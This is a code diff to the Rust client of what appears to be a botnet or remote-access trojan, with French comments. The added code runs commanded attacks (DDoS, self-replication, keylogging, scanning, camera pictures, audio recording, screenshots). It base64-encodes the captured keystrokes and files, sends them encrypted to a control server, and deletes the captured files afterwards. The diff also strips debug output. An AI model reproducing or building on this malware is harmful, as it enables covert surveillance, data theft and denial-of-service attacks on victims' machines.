@@ -26,6 +26,10 @@ use std::process::{Command};
 use std::time::Duration;
 use std::thread;
 
+
+use std::io::prelude::*;
+use base64::prelude::*;
+
 #[cfg(client_os = "linux")]
 use std::os::unix::fs::PermissionsExt;
 
@@ -345,9 +349,8 @@ fn execute_attack(
     let args: Vec<&str> = args.split_whitespace().collect();
 
 
-    println!("{:?}", Command::new(&executable_path).args(&args));
-    let output = Command::new(&executable_path).args(&args).output()?; 
-    println!("output: {:?}", output);
+    // println!("{:?}", Command::new(&executable_path).args(&args));
+    let output = Command::new(&executable_path).args(&args).output()?;
     
 
     // Check if the command was successful
@@ -365,6 +368,8 @@ fn execute_attack(
 
     
 }
+
+
 
 fn main() -> io::Result<()> {
 
@@ -510,9 +515,43 @@ fn main() -> io::Result<()> {
 
                     match execute_attack(type_attack.clone().as_str(), &args , &symetric_key, &iv, &stream_clone) {
                         Ok(output) => {
-                            let response = format!("{{\"id\":\"{}\",\"attack\":\"{}\",\"output\":\"{}\"}}", id_attack, type_attack, output);
-                            send_encrypted_string_to_server(&stream_clone, response, symetric_key.clone(), iv.clone());
+                            // si l'attaque ne nécessite pas d'envoyer de fichier
+                            if type_attack == "ddos" || type_attack == "autorep"{
+                                let response = format!("{{\"id\":\"{}\",\"attack\":\"{}\",\"output\":\"{}\"}}", id_attack, type_attack, output);
+                                send_encrypted_string_to_server(&stream_clone, response, symetric_key.clone(), iv.clone());
+
+
+                            // si l'attaque nécessite d'envoyer de la donnée à garder
+                            }else if type_attack == "keylogger" || type_attack == "scan"{
+                                let response = format!("{{\"id\":\"{}\",\"attack\":\"{}\",\"output\":\"{}\"}}", id_attack, type_attack, BASE64_STANDARD.encode(output.as_bytes()));
+                                // println!("{:?}", response);
+                                send_encrypted_string_to_server(&stream_clone, response, symetric_key.clone(), iv.clone());
+                                
+
+                            // si l'attaque nécessite d'envoyer un fichier
+                            }else if type_attack == "picture" || type_attack == "record" || type_attack == "keylogger" || type_attack == "screenshot"{
+                                // lecture du fichier
+                                // println!("{:?}", output);
+                                let file_path = output.replace("\n", "");
+
+                                match fs::read(file_path.clone()){
+                                    Ok(file_data) => {
+                                        let response = format!("{{\"id\":\"{}\",\"attack\":\"{}\",\"output\":\"{}\"}}", id_attack, type_attack, BASE64_STANDARD.encode(file_data.as_slice()));
+                                        send_encrypted_string_to_server(&stream, response, symetric_key.clone(), iv.clone());
+
+                                        // suppression du fichier
+                                        fs::remove_file(file_path).expect("Error while deleting file");
+                                    }
+
+                                    Err(e) => {
+                                        let response = format!("{{\"id\":\"{}\",\"attack\":\"{}\",\"output\":\"error\"}}", id_attack, type_attack);
+                                        send_encrypted_string_to_server(&stream_clone, response, symetric_key.clone(), iv.clone());
+                                        println!("Error reading file: {}", e);
+                                    }
+                                }
+                            }
                         }
+
                         Err(e) => {
                             let response = format!("{{\"id\":\"{}\",\"attack\":\"{}\",\"output\":\"error\"}}", id_attack, type_attack);
                             send_encrypted_string_to_server(&stream_clone, response, symetric_key.clone(), iv.clone());
